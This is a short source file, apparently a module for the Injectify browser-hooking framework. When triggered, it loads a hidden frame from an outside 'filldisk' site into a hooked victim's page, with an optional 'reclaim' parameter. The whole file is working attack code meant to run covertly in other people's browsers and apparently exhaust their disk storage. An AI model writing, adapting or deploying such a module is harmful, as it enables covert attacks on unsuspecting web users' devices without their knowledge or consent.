import { Module, injectify } from '../../../definitions/module'

/**
 * Parse params
 */
let reclaim = ''
if (typeof Module.params == 'object') {
    if (Module.params.reclaim) reclaim = '?reclaim=true'
}

/**
 * Load the embed module
 */
injectify.module('embed', {
    url: `http://1.filldisk.com/frame.html${reclaim}`,
    hidden: true,
}).then((embed) => {
    Module.resolve(embed)
})
